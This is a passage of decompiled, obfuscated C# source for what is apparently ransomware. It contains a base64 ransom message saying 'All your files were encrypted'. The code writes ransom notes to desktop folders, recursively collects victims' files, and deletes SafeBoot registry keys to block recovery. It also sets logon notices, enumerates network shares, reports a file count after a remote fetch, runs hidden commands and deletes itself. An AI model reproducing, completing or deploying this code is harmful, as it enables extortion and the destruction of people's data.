				streamWriter.WriteLine(iBDvjzxzEcC(getString_0(107395243)));
				streamWriter.WriteLine(getString_0(107396683));
				streamWriter.WriteLine(iBDvjzxzEcC(getString_0(107390513)));
				streamWriter.WriteLine(PSLFxlnexYjPkVyG);
				if (CYtyMsjHbrwM == getString_0(107397109))
				{
					streamWriter.WriteLine(getString_0(107396683));
					streamWriter.WriteLine(iBDvjzxzEcC(getString_0(107390480)) + Convert.ToString(fQuiHGzOTAlx.Count));
				}
				if (lHJbFcHZdNnC)
				{
					streamWriter.WriteLine(getString_0(107396683));
					streamWriter.WriteLine(iBDvjzxzEcC(getString_0(107390371)));
					streamWriter.WriteLine(orMQkbNvmzZPsHt.XWqsewBKiLfR());
				}
			}
			else
			{
				string text11 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395276));
				if (!text11.Contains(PSLFxlnexYjPkVyG) && !IflXfWBKZN)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395276), getString_0(107390338) + PSLFxlnexYjPkVyG);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in kEshrQncftX)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395276)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395276), item + getString_0(107395276), overwrite: true);
				}
				else
				{
					string text12 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395276));
					if (!text12.Contains(PSLFxlnexYjPkVyG) && !IflXfWBKZN)
					{
						File.AppendAllText(item + getString_0(107395276), getString_0(107390338) + PSLFxlnexYjPkVyG);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!CQvIJIjeDHGW && num > 10)
			{
				break;
			}
		}
		if (bMkJlSMZTmkVPl == getString_0(107396852))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107390341)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107390341));
					streamWriter2.WriteLine(iBDvjzxzEcC(getString_0(107389796)));
					streamWriter2.WriteLine(getString_0(107396683));
					streamWriter2.WriteLine(iBDvjzxzEcC(getString_0(107402344)));
					streamWriter2.WriteLine(PSLFxlnexYjPkVyG + iBDvjzxzEcC(getString_0(107402255)));
					if (CYtyMsjHbrwM == getString_0(107397109))
					{
						streamWriter2.WriteLine(getString_0(107396683));
						streamWriter2.WriteLine(iBDvjzxzEcC(getString_0(107402210)) + iBDvjzxzEcC(getString_0(107390480)) + Convert.ToString(fQuiHGzOTAlx.Count) + iBDvjzxzEcC(getString_0(107402255)));
					}
					if (lHJbFcHZdNnC)
					{
						streamWriter2.WriteLine(getString_0(107396683));
						streamWriter2.WriteLine(iBDvjzxzEcC(getString_0(107390371)));
						streamWriter2.WriteLine(orMQkbNvmzZPsHt.XWqsewBKiLfR());
					}
				}
				else
				{
					string text13 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395276));
					if (!text13.Contains(PSLFxlnexYjPkVyG) && !IflXfWBKZN)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107390341), iBDvjzxzEcC(getString_0(107402210)) + getString_0(107390338) + PSLFxlnexYjPkVyG + iBDvjzxzEcC(getString_0(107402255)));
					}
				}
			}
			catch
			{
			}
		}
		if (jKmROTPyfgIG == getString_0(107396852))
		{
			try
			{
				if (CYtyMsjHbrwM == getString_0(107397109))
				{
					orMQkbNvmzZPsHt.jOkjdnrkUHMWfl(getString_0(107402181), getString_0(107402144), getString_0(107402163), string.Concat(iBDvjzxzEcC(getString_0(107396237)), new WebClient().DownloadString(iBDvjzxzEcC(getString_0(107396692))), getString_0(107402154), iBDvjzxzEcC(getString_0(107396678)), DateTime.Now, getString_0(107396683), iBDvjzxzEcC(getString_0(107402149)), Convert.ToString(fQuiHGzOTAlx.Count), getString_0(107396683), iBDvjzxzEcC(getString_0(107396605)), PSLFxlnexYjPkVyG));
				}
				else
				{
					orMQkbNvmzZPsHt.jOkjdnrkUHMWfl(getString_0(107402181), getString_0(107402144), getString_0(107402163), string.Concat(iBDvjzxzEcC(getString_0(107396237)), new WebClient().DownloadString(iBDvjzxzEcC(getString_0(107396692))), getString_0(107402154), iBDvjzxzEcC(getString_0(107396678)), DateTime.Now, getString_0(107396683), iBDvjzxzEcC(getString_0(107402149)), Convert.ToString(fQuiHGzOTAlx.Count), getString_0(107396683), iBDvjzxzEcC(getString_0(107396605)), PSLFxlnexYjPkVyG));
				}
			}
			catch
			{
			}
		}
		if (WXazMqNlFCpUGp == getString_0(107396852))
		{
			try
			{
				jKouDxxIVVZtGP.eueYnRXLQADLA(new Uri(getString_0(107401556)));
			}
			catch
			{
			}
		}
		if (bMkJlSMZTmkVPl == getString_0(107397109))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395276)))
				{
					Process.Start(iBDvjzxzEcC(getString_0(107401587)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395276));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107390341)))
				{
					Process.Start(iBDvjzxzEcC(getString_0(107401530)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107390341));
				}
			}
			catch
			{
			}
		}
		if (rGfFEILyJI == getString_0(107396852))
		{
			if (SgOqmfmWgCMNrdugt == getString_0(107396852) && !string.IsNullOrEmpty(mEpMhYqsELjvCfA) && !string.IsNullOrEmpty(bzSBnkmcadit))
			{
				ZPlqEDcqHMhk(mEpMhYqsELjvCfA, bzSBnkmcadit);
			}
			else
			{
				ZPlqEDcqHMhk(getString_0(107401545), getString_0(107401516));
			}
		}
		if (CXPDhTmLTlpN != getString_0(107401762))
		{
			uShDngELbQ(CXPDhTmLTlpN);
		}
		if (!string.IsNullOrEmpty(fbKaZQvVeOFg))
		{
			try
			{
				File.Delete(fbKaZQvVeOFg);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396737))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396737)));
			}
		}
		catch (Exception ex18)
		{
			try
			{
				File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107401777) + ex18.Message);
			}
			catch (Exception)
			{
			}
		}
		if (SBPYnaSzKyFP)
		{
			try
			{
				File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107401732));
			}
			catch (Exception)
			{
			}
		}
		if (VMhrtGevQTYP == getString_0(107401687))
		{
			DDPPVlYvvdwJtdD();
		}
	}

	public static void iuRhbZaGQIY()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(iBDvjzxzEcC(getString_0(107401710)), iBDvjzxzEcC(getString_0(107401545)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int brkKChrnlFP(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> LDoRIkWeLaR(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107401012)) && !text.Contains(getString_0(107400987)) && !text.Contains(getString_0(107400954)) && !text.ToLower().Contains(getString_0(107400969)) && !text.ToLower().Contains(getString_0(107400924)) && !text.Contains(getString_0(107400899)) && !text.Contains(getString_0(107400910)) && !text.ToLower().Contains(getString_0(107400865)) && !text.ToLower().Contains(getString_0(107400852)) && !text.ToLower().Contains(getString_0(107400847)) && !text.ToLower().Contains(getString_0(107400838)) && !text.ToLower().Contains(getString_0(107401301)) && !text.ToLower().Contains(getString_0(107401320)) && !text.ToLower().Contains(getString_0(107401275)) && !text.ToLower().Contains(getString_0(107401286)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107401261)) && !fileInfo.FullName.Contains(getString_0(107401212)) && !fileInfo.FullName.Contains(getString_0(107401227)) && !fileInfo.FullName.Contains(getString_0(107401178)) && !fileInfo.FullName.Contains(getString_0(107401193)) && !fileInfo.FullName.Contains(getString_0(107401144)) && !fileInfo.FullName.Contains(getString_0(107401159)) && !fileInfo.FullName.Contains(getString_0(107401110)) && !fileInfo.FullName.Contains(getString_0(107401129)) && !fileInfo.FullName.Contains(getString_0(107401076)) && !fileInfo.FullName.ToLower().Contains(getString_0(107401095)) && !fileInfo.FullName.ToLower().Contains(getString_0(107400538)) && !fileInfo.FullName.ToLower().Contains(getString_0(107400553)) && !fileInfo.FullName.ToLower().Contains(getString_0(107400504)) && !fileInfo.FullName.Contains(iBDvjzxzEcC(getString_0(107400519))) && !fileInfo.FullName.Contains(getString_0(107400494)) && !fileInfo.FullName.Contains(getString_0(107396737)) && !fileInfo.FullName.Contains(getString_0(107400449)) && !fileInfo.FullName.EndsWith(getString_0(107395286)) && !fileInfo.FullName.EndsWith(getString_0(107400456)) && !fileInfo.FullName.EndsWith(getString_0(107400419)) && !fileInfo.FullName.EndsWith(getString_0(107400414)) && !fileInfo.FullName.EndsWith(getString_0(107400409)) && !fileInfo.FullName.Contains(getString_0(107400404)) && !fileInfo.FullName.Contains(COjZSLMnxffln) && !fileInfo.FullName.Contains(ndioqUCcjeEwRygxn) && !fileInfo.FullName.Contains(zSigBrcrKLvB))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(nPUtTAwIhKI) * 1024.0 * 1024.0 && CoRisaOZQor == getString_0(107396852))
						{
							list.Add(fileInfo.FullName);
							FMQDDnzeKou(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && CoRisaOZQor == getString_0(107397109))
						{
							list.Add(fileInfo.FullName);
							FMQDDnzeKou(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void XNApIDlSXbXjYnA()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107400387));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!uneznyCLJqjxYvh.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107400366), getString_0(107396774)).Replace(getString_0(107400361), getString_0(107400366))
					.Replace(getString_0(107400320), getString_0(107401556))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					uneznyCLJqjxYvh.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107400366), getString_0(107396774)).Replace(getString_0(107400361), getString_0(107400366))
						.Replace(getString_0(107400320), getString_0(107401556))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107400315), getString_0(107401556)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string pjARRmeFiHBjb(string iLFCJMFlYRNSXcvl = "", string GbCbqKqnZEXhW = "")
	{
		string result = getString_0(107401556);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = iLFCJMFlYRNSXcvl,
				Arguments = GbCbqKqnZEXhW,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void quAnXoPuXpLqdbj(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107400338),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string IpOHiOtFllLVXSK(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string iBDvjzxzEcC(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void NcgtUpdJSRHPMF(string mepgCTKESCwB = "", string hKXsvfnYIaCW = "SW5mb3JtYXRpb24uLi4=", string gLJNQIEXrrhZu = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		mepgCTKESCwB = IpOHiOtFllLVXSK(getString_0(107400801));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(iBDvjzxzEcC(mepgCTKESCwB), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(iBDvjzxzEcC(getString_0(107400704)), iBDvjzxzEcC(hKXsvfnYIaCW));
				registryKey.SetValue(iBDvjzxzEcC(getString_0(107400671)), iBDvjzxzEcC(gLJNQIEXrrhZu));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			mepgCTKESCwB = IpOHiOtFllLVXSK(getString_0(107400642));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(iBDvjzxzEcC(mepgCTKESCwB), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(iBDvjzxzEcC(getString_0(107400025)), iBDvjzxzEcC(hKXsvfnYIaCW));
				registryKey.SetValue(iBDvjzxzEcC(getString_0(107399992)), iBDvjzxzEcC(gLJNQIEXrrhZu));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void FWAdHHyyptFTEL()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (SgOqmfmWgCMNrdugt == getString_0(107396852) && !string.IsNullOrEmpty(mEpMhYqsELjvCfA) && !string.IsNullOrEmpty(bzSBnkmcadit))
				{
					NcgtUpdJSRHPMF(getString_0(107401556), mEpMhYqsELjvCfA, bzSBnkmcadit);
				}
				else
				{
					NcgtUpdJSRHPMF(getString_0(107401556), getString_0(107401545), getString_0(107401516));
				}
			}
		}
		catch
		{
		}
	}

	public static void ZPlqEDcqHMhk(string XbGKTHirNeJaRQZp = "SW5mb3JtYXRpb24uLi4=", string pFgPypiatrAE = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(iBDvjzxzEcC(XbGKTHirNeJaRQZp));
		val.set_BalloonTipText(iBDvjzxzEcC(pFgPypiatrAE));
		val.ShowBalloonTip(30000);
	}

	public static void uShDngELbQ(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		pjARRmeFiHBjb(iBDvjzxzEcC(getString_0(107399963)), getString_0(107399978) + text + getString_0(107399937) + string_0);
	}

	private static void kHMNgvEgJuEA()
	{
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_025e: Expected O, but got Unknown
		//IL_0280: Unknown result type (might be due to invalid IL or missing references)
		//IL_0287: Expected O, but got Unknown
		BwkTFAHCCQxII();
		List<WnOnbNfZRZz> list = WnOnbNfZRZz.lUwFzvFBvPLOcVh();
		foreach (WnOnbNfZRZz item in list)
		{
			GvytrdWotRtJ.Add(item.IPAddress);
		}
		List<string> gvytrdWotRtJ = GvytrdWotRtJ;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a = delegate(string string_0)
			{
				CvtvsehZvVox CS_0024_003C_003E8__locals0 = new CvtvsehZvVox();
				CS_0024_003C_003E8__locals0.OfutQEOgrcWV = string_0;
				if ((!CS_0024_003C_003E8__locals0.OfutQEOgrcWV.StartsWith(getString_0(107398180)) && !CS_0024_003C_003E8__locals0.OfutQEOgrcWV.StartsWith(getString_0(107398143)) && !CS_0024_003C_003E8__locals0.OfutQEOgrcWV.StartsWith(getString_0(107398134)) && !CS_0024_003C_003E8__locals0.OfutQEOgrcWV.StartsWith(getString_0(107401556))) || !DLNInMwPrHTI.YuPQEPIQgrKeMjD(CS_0024_003C_003E8__locals0.OfutQEOgrcWV))
				{
					return;
				}
				try
				{
					Thread.Sleep(gcVeDsTCahqU);
					uneznyCLJqjxYvh.Add(getString_0(107400366) + CS_0024_003C_003E8__locals0.OfutQEOgrcWV + getString_0(107398153));
					try
					{
						if (RxwgNpmsCUXw)
						{
							Console.WriteLine(getString_0(107400366) + CS_0024_003C_003E8__locals0.OfutQEOgrcWV + getString_0(107398153));
						}
					}
					catch
					{
					}
					Parallel.For(68, 91, delegate(int int_0)
					{
						Thread.Sleep(gcVeDsTCahqU);
						uneznyCLJqjxYvh.Add(CvtvsehZvVox.getString_0(107400372) + CS_0024_003C_003E8__locals0.OfutQEOgrcWV + CvtvsehZvVox.getString_0(107396780) + (char)int_0 + CvtvsehZvVox.getString_0(107349519));
						try
						{
							if (RxwgNpmsCUXw)
							{
								Console.WriteLine(CvtvsehZvVox.getString_0(107400372) + CS_0024_003C_003E8__locals0.OfutQEOgrcWV + CvtvsehZvVox.getString_0(107396780) + (char)int_0 + CvtvsehZvVox.getString_0(107349519));
							}
						}
						catch
						{
						}
					});
				}
				catch
				{
				}
			};
		}
		Parallel.ForEach(gvytrdWotRtJ, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a);
		try
		{
			DLNInMwPrHTI.CTWWGHAwiHnvS cTWWGHAwiHnvS = new DLNInMwPrHTI.CTWWGHAwiHnvS(DLNInMwPrHTI.HjHfGfuedGgt.XMyagMAkzU, DLNInMwPrHTI.wPOIfYjjdX.KXauamBoICK, DLNInMwPrHTI.NyPHLTyiWybvzs.lPYmWWQLQEye, DLNInMwPrHTI.epTWuZTaWycYz.SMNtFykeeVbbm);
			foreach (string item2 in cTWWGHAwiHnvS)
			{
				MatchCollection matchCollection = Regex.Matches(item2, getString_0(107399932));
				foreach (Match item3 in matchCollection)
				{
					try
					{
						if (!uneznyCLJqjxYvh.Contains(item3.ToString()))
						{
							uneznyCLJqjxYvh.Add(item3.ToString());
						}
					}
					catch
					{
					}
					try
					{
						if (RxwgNpmsCUXw)
						{
							Console.WriteLine(item3.ToString());
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		YCyShzHVIaHvgb.pWRyLCvaJsD();
		try
		{
			if (RxwgNpmsCUXw)
			{
				Console.WriteLine(getString_0(107399883));
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = IpOHiOtFllLVXSK(getString_0(107400642));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(iBDvjzxzEcC(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(iBDvjzxzEcC(getString_0(107399810)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(iBDvjzxzEcC(getString_0(107400297)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (KAbTnSEazgmpKG == getString_0(107396852))
		{
			zKsOSeRCEuOxZ.aLXuqmTClRjOFYj();
		}
		try
		{
			if (RxwgNpmsCUXw)
			{
				Console.WriteLine(getString_0(107400220));
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107400387));
		ManagementObjectEnumerator enumerator4 = val.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator4.get_Current();
				if (uneznyCLJqjxYvh.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107400366), getString_0(107396774)).Replace(getString_0(107400361), getString_0(107400366))
					.Replace(getString_0(107400320), getString_0(107401556))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (RxwgNpmsCUXw)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107400366), getString_0(107396774)).Replace(getString_0(107400361), getString_0(107400366))
							.Replace(getString_0(107400320), getString_0(107401556))
							.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107400315), getString_0(107401556)));
					}
				}
				catch
				{
				}
				uneznyCLJqjxYvh.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107400366), getString_0(107396774)).Replace(getString_0(107400361), getString_0(107400366))
					.Replace(getString_0(107400320), getString_0(107401556))
					.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107400315), getString_0(107401556)));
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		try
		{
			if (RxwgNpmsCUXw)
			{
				Console.WriteLine(getString_0(107400163));
			}
		}
		catch
		{
		}
	}

	public static bool WZIBqhSKnPhYMFBW()
	{
		WebRequest webRequest = WebRequest.Create(getString_0(107400094));
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void HNxxgdChoh(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = iBDvjzxzEcC(getString_0(107400061));
		processStartInfo.Arguments = getString_0(107399520) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool zrnHsDHKDix(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool QuwBdvGGQnzo(string string_0)
	{
		try
		{
			PbhoBWPuGhtGLm CS_0024_003C_003E8__locals0 = new PbhoBWPuGhtGLm();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.RFtwrSGCcXR = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.RFtwrSGCcXR);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107399515);
		}
		catch
		{
			return false;
		}
	}

	public static void gwPKqQopkMwzd()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = IpOHiOtFllLVXSK(getString_0(107399538));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(iBDvjzxzEcC(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(iBDvjzxzEcC(getString_0(107399400)));
					registryKey.DeleteSubKey(iBDvjzxzEcC(getString_0(107399375)));
					registryKey.DeleteSubKey(iBDvjzxzEcC(getString_0(107399326)));
					registryKey.DeleteSubKey(iBDvjzxzEcC(getString_0(107399333)));
					registryKey.DeleteSubKey(iBDvjzxzEcC(getString_0(107400061)));
					registryKey.DeleteSubKey(iBDvjzxzEcC(getString_0(107399308)));
					registryKey.DeleteSubKey(iBDvjzxzEcC(getString_0(107399963)));
					registryKey.Close();
				}
				string_ = IpOHiOtFllLVXSK(getString_0(107399791));
				registryKey = Registry.LocalMachine.OpenSubKey(iBDvjzxzEcC(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(iBDvjzxzEcC(getString_0(107399694)));
					registryKey.Close();
				}
				string_ = IpOHiOtFllLVXSK(getString_0(107399645));
				registryKey = Registry.LocalMachine.OpenSubKey(iBDvjzxzEcC(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(iBDvjzxzEcC(getString_0(107399694)));
					registryKey.Close();
				}
				string_ = IpOHiOtFllLVXSK(getString_0(107399645));
				registryKey = Registry.CurrentUser.OpenSubKey(iBDvjzxzEcC(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(iBDvjzxzEcC(getString_0(107399694)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			pjARRmeFiHBjb(iBDvjzxzEcC(getString_0(107399660)), iBDvjzxzEcC(getString_0(107399611)));
			pjARRmeFiHBjb(iBDvjzxzEcC(getString_0(107399594)), iBDvjzxzEcC(IpOHiOtFllLVXSK(getString_0(107399553))));
			pjARRmeFiHBjb(iBDvjzxzEcC(getString_0(107399594)), iBDvjzxzEcC(getString_0(107398927)));
			pjARRmeFiHBjb(iBDvjzxzEcC(getString_0(107398866)), iBDvjzxzEcC(getString_0(107398817)));
		}
		catch
		{
		}
	}

	public static void HiuKKSnyYq(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(iBDvjzxzEcC(getString_0(107399256)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void PnaBoXyBFAvZY()
	{
		string string_ = IpOHiOtFllLVXSK(getString_0(107399231));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(iBDvjzxzEcC(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(iBDvjzxzEcC(getString_0(107399182)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void BwkTFAHCCQxII()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			pjARRmeFiHBjb(iBDvjzxzEcC(getString_0(107399149)), iBDvjzxzEcC(getString_0(107399104)));
			pjARRmeFiHBjb(iBDvjzxzEcC(getString_0(107399149)), iBDvjzxzEcC(getString_0(107398462)));
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string fghmVsWLwigdi(string dDrVgnblHqeKVRW, int OIrllnBBXys = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(OIrllnBBXys);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(dDrVgnblHqeKVRW, 1, intPtr, ref OIrllnBBXys) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void DDPPVlYvvdwJtdD()
	{
		pjARRmeFiHBjb(getString_0(107396422), iBDvjzxzEcC(getString_0(107398348)));
		string text = iBDvjzxzEcC(getString_0(107398666));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107400320) + text + getString_0(107400320) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396422);
